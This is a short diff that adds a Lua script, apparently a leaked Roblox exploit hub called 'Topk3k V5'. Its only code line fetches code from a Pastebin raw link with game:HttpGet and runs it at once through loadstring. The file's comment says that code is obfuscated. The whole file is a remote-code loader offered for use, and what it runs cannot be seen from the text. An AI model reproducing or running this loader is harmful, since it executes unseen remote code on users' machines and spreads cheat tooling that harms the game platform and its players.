@@ -1,0 +1,4 @@
+-- Topk3k V5 Leaked --
+-- All Scripts Obfuscated --
+
+loadstring(game:HttpGet("https://pastebin.com/raw/yiUkqTXH", true))()
